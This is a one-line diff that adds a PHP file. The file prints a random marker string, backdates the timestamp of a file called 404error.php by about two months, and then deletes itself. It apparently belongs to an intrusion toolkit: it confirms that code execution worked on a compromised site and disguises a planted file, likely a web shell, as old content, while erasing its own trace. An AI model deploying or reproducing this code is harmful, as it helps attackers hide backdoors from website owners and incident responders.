@@ -1,0 +1,1 @@
+<?php echo "dRAszwNZEC"; if (file_exists("./404error.php")){ touch("./404error.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*g7wTpPURCKPZbBuc7QWx*/ ?>
